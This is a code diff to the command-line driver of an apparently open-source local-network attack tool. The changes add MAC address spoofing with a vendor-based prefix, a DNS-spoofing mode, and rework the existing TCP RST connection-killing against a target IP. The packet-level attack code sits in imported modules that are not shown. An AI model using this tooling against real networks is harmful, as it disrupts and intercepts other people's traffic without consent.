@@ -18,6 +18,7 @@
 # USA
 
 import os
+import random
 import optparse
 import core.config
 from core.utils import *
@@ -26,12 +27,16 @@ from core.mitm import *
 def parse_arguments():
 	""" parse arguments """
 	parser = optparse.OptionParser('Usage: %prog [options] dev')
-	parser.add_option('-0', '--spoof', action = 'store_const', const = 1, dest = 'mode', help = 'Spoof mode, generate a fake MAC address to be used during attack')
-	parser.add_option('-1', '--sessions-scan', action = 'store_const', const = 2, dest = 'mode', help = 'Sessions scan mode')
-	parser.add_option('-m', dest = 'macaddr', help = 'Mac address')
+	parser.add_option('-x', '--spoof', action = 'store_const', const = 1, dest = 'spoof', help = 'Spoof mode, generate a fake MAC address to be used during attack')
+	parser.add_option('-1', '--sessions-scan', action = 'store_const', const = 1, dest = 'mode', help = 'Sessions scan mode')
+	parser.add_option('-2', '--dns-spoof', action = 'store_const', const = 2, dest = 'mode', help = 'Dns spoofing')
+	parser.add_option('-m', dest = 'macaddr', help = 'Mac address octet prefix (could be an entire MAC address in the form AA:BB:CC:DD:EE:FF)')
+	parser.add_option('-M', dest = 'manufacturer', help = 'Manufacturer of the wireless device, for retrieving a manufactur based prefix for MAC spoof')
 	parser.add_option('-s', dest = 'source', help = 'Source ip address (e.g. a class C address like 192.168.1.150) usually the router address')
 	parser.add_option('-t', dest = 'target', help = 'Target ip address (e.g. a class C address like 192.168.1.150)')
 	parser.add_option('-p', dest = 'port', help = 'Target port to shutdown')
+	parser.add_option('-a', dest = 'host', help = '')
+	parser.add_option('-r', dest = 'redir', help = '')
 	parser.add_option('-v', '--verbose', action = 'store_const', const = 1, dest = 'verbosity', help = 'Verbose output mode')
 	parser.add_option('-d', '--dotted', action = 'store_const', const = 1, dest = 'dotted', help = 'Dotted output mode')
 	return parser.parse_args()
@@ -43,11 +48,22 @@ if not os.geteuid() == 0:
 (options, args) = parse_arguments()
 
 mac_addr = ""
+original_mac_addr = get_mac_addr(args[0])
+changed = False
+
 print ""
+
 if len(args) != 1:
 	print sys.argv[0] + ' -h for help'
 	print '[!] Must specify interface'
 	exit()
+
+if not options.source:
+	try:
+		options.source = get_default_gateway_linux()
+	except:
+		print "[!] Unable to retrieve default gateway, please specify one using -s option"
+		sys.exit(2)
 
 if not options.target:
 	print '[!] Must specify target address'
@@ -59,59 +75,80 @@ if options.verbosity == 1:
 if options.dotted == 1:
 	core.config.dotted = True
 
-if not options.source:
-	try:
-		options.source = get_default_gateway_linux()
-	except:
-		print "[!] Unable to retrieve default gateway, please specify one using -s option"
-		sys.exit(2)
-
-if not options.macaddr and options.mode != 1:
-	try:
-		options.macaddr = get_mac_addr(args[0])
-		mac_addr = options.macaddr
-	except:
-		print "[!] Unable to retrieve a valid MAC address for device %s, please specify one using -m option"
-		sys.exit(2)
-
-if options.mode == 1:
-	if not options.macaddr:
-		try:
-			fake_mac = fake_mac_address()
-			change_mac(args[0], fake_mac)
-			print "[+] Fake MAC generated " + G + fake_mac + W + ""
-		except:
-			print "[!] Unable to change MAC address to device %s" % args[0]
-			sys.exit(2)
-		print "[+] Using " + G + fake_mac + W + " MAC address"
-		if options.port:
-			rst_inject(args[0], parse_mac(fake_mac), options.source, options.target, options.port)
+if options.spoof == 1:
+	if not options.macaddr and not options.manufacturer:
+		decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
+		if decision == 'y':
+			mac_addr = fake_mac_address()
+			try:
+				change_mac(args[0], mac_addr)
+				changed = True
+			except:
+				# print "[!] Unable to change MAC address to device %s" % args[0]
+				# sys.exit(2)
+				pass
 		else:
-			rst_inject(args[0], parse_mac(fake_mac), options.source, options.target)
-		change_mac(args[0], mac_addr)
-	else:
-		changed = False
-		mac_addr = options.macaddr
-		print "[+] Using " + G + mac_addr + W + " MAC address"
-		original_mac_addr = get_mac_addr(args[0])
-		if parse_mac(mac_addr) != parse_mac(original_mac_addr):
-			change_mac(args[0], mac_addr)
-			changed = True
-		if options.port:
-			rst_inject(args[0], parse_mac(mac_addr), options.source, options.target, options.port)
-		else:
-			rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
-		if changed == True:
-			change_mac(args[0], original_mac_addr)
+			mac_addr = original_mac_addr
 
-elif options.mode == 2:
-	get_sessions(args[0], options.target)
+	elif options.macaddr and not options.manufacturer:
+		if parse_mac(options.macaddr) != parse_mac(original_mac_addr):
+			mac_addr = fake_mac_address(mac_to_hex(options.macaddr))
+			decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
+			if decision == 'y':
+				try:
+					change_mac(args[0], mac_addr)
+					changed = True
+				except:
+					# print "[!] Unable to change MAC address to device %s" % args[0]
+					# sys.exit(2)
+					pass
+			else:
+				mac_addr = original_mac_addr
+
+		else:
+			mac_addr = options.macaddr
+
+	elif options.manufacturer:
+		macs = get_manufacturer(options.manufacturer)
+		mac_addr = fake_mac_address(mac_to_hex(random.choice(macs)))
+		decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
+		if decision == 'y':
+			try:
+				change_mac(args[0], mac_addr)
+				changed = True
+			except:
+				# print "[!] Unable to change MAC address to device %s" % args[0]
+				# sys.exit(2)
+				pass
+		else:
+			mac_addr = original_mac_addr
 
 else:
-	mac_addr = options.macaddr
-	print "[+] Using " + G + mac_addr + W + " MAC address"
-	print "[+] Set " + G + options.source + W + " as default gateway"
+	if not options.macaddr:
+		mac_addr = original_mac_addr
+	else:
+		mac_addr = options.macaddr
+
+print "[+] Using " + G + mac_addr + W + " MAC address"
+print "[+] Set " + G + options.source + W + " as default gateway"
+time.sleep(3)
+if options.mode == 1:
+	get_sessions(args[0], options.target)
+
+elif options.mode == 2:
+	dns_spoof(args[0], parse_mac(mac_addr), options.source, options.target, options.host, options.redir)
+
+else:
 	if options.port:
 		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target, options.port)
 	else:
 		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
+	if changed == True:
+		try:
+			time.sleep(1)
+			change_mac(args[0], original_mac_addr)
+		except:
+			# print "[!] Unable to change MAC address to device %s" % args[0]
+			# sys.exit(2)
+			pass
+
